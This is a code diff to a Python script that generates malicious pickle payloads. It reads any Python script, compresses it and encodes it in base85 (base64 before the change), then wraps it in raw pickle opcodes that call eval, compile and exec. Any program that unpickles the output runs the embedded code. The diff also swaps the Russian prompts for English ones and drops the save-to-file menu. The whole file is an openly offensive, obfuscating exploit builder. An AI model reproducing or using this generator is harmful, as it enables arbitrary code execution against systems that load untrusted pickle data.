@@ -1,27 +1,19 @@
-from base64 import b64encode
+from base64 import b85encode
+from zlib import compress
 
-path = input('Введите название python скрипта>')
+path = input('Python script filename>')
 try:
     data = open(path, 'rb').read()
 except FileNotFoundError:
     print('File not found')
     exit()
 
-data = b64encode(data)
+data = b85encode(compress(data))
 
-payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b64decode;exec(b64decode("' + data + b'").decode())\nV-\nVexec\ntRtR.'
+payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(V'
+payload += b'from base64 import b85decode;'
+payload += b'from zlib import decompress;'
+payload += b'exec(decompress(b85decode("' + data + b'")).decode())'
+payload += b'\nV-\nVexec\ntRtR.'
 
-print('''
-1 - вывести payload
-2 - сохранить payload в файл
-''')
-
-ask = int(input('>'))
-if ask == 2:
-    name = input('Введите название выходного файла>')
-    file = open(name, 'wb')
-    file.write(payload)
-    file.close()
-    print('Payload сохранен в файл ' + name)
-else:
-    print(payload)
+print(payload)
